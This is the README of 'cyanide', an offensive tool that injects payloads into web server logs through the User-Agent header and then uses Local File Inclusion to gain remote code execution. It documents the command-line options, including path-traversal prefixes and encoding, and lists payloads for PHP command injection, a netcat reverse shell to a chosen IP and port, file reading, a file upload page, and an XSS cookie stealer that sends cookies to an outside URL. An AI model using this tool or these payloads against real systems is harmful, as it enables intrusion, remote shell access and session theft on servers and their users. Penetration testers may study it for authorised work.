# cyanide
[![Visits Badge](https://badges.strrl.dev/visits/Noxtal/cyanide)](https://badges.strrl.dev)

(a wiki is available [here](https://cyanide.noxtal.com))

Cyanide is a tool to poison request logs by injecting a payload in the user-agent. They can then be accessed back using an Local File Inclusion to trigger Remote Code Execution. It currently has a total of 6 great standalone payloads.

## Installation
As of now, the only way of using this project is by cloning the repo or with [this download link](https://github.com/Noxtal/cyanide/archive/refs/heads/master.zip").

## Usage
```
usage: cyanide.py [-h] [-q] [-Pl] [-pl [PAYLOAD ...]] [-m METHOD] [-P PARAMETER]
                  [-C COOKIES] [-e] [-E] [-p PREFIX] [-s SUFFIX] [-u URL]

Log poisoner. Turns a Local File Inclusion to a Remote Code Execution. Counts 6
different payloads for now.

optional arguments:
  -h, --help            show this help message and exit
  -q, --quiet, --no-banner
                        Quiet mode. No banner.
  -Pl, --payloads, --list
                        List all possible payloads.
  -pl [PAYLOAD ...], --payload [PAYLOAD ...], --set-payload [PAYLOAD ...]
                        Set payload (by index or ID). Use -Pl to list available
                        payloads.
  -m METHOD, --method METHOD
                        HTTP request method. Ex.: POST
  -P PARAMETER, --par PARAMETER, --parameter PARAMETER
                        Query parameter name. Ex.: '-P view' => '?view='
  -C COOKIES, --cookies COOKIES
                        Set request cookies such as PHP session in JSON format (ex.:
                        '{"key":"value", ...}').
  -e, --encode, --dds-encode
                        URL encode ../
  -E, --double-encode, --dds-double-encode
                        Double-encode ../
  -p PREFIX, --prefix PREFIX
                        Query prefix. Ex.: '../../../../../etc/cat/'
  -s SUFFIX, --suffix SUFFIX
                        Query suffix. Ex.: '&other='
  -u URL, --URL URL, --url URL
                        URL to attack.
```

Payloads:
```
[?] PHPCMD (min. 72 chars, requires 0 args) -> PHP Simple Command Injection: [PHP] Simple command injection with query variable 'c'. Usage: Ex.: ?c=ls
[?] PHPB64CMD (min. 102 chars, requires 0 args) -> PHP Simple Base64 Command Injection: [PHP] Simple command injection with query variable 'b', but the command is base64 and URL encoded. Usage: Ex.: ?b=bHM%3D
[?] PHPREVSHELL (min. 78 chars, requires 2 args) -> PHP Simple NETCAT Reverse Shell: [PHP] Simple Reverse Shell. Needs two arguments, the IP and port. WARNING: REQUIRES Netcat. Usage: Specify the arguments after choosing the payload. Ex.: -pl PHPREVSHELL 127.0.0.1 4444
[?] PHPREADFILE (min. 130 chars, requires 0 args) -> PHP File Reader: [PHP] Read a file's contents. Using parameter 'f' to specificy a filename. Usage: Ex.: ?f=filename.ext
[?] PHPUPLOAD (min. 328 chars, requires 0 args) -> PHP Simple File Upload: [PHP] Simple file upload page to pop in the logs. Usage: You should find a typical file upload section in the logs.
[?] JSCOOKIEXSS (min. 104 chars, requires 1 args) -> JavaScript Simple XSS Cookie Stealer: [JS] Simple XSS Cookie Stealer. Needs one argument being the link to send a request with the cookies to. Usage: Specify the URL after choosing the payload. Ex.: -pl JSCOOKIEXSS http://myurl.com/
```
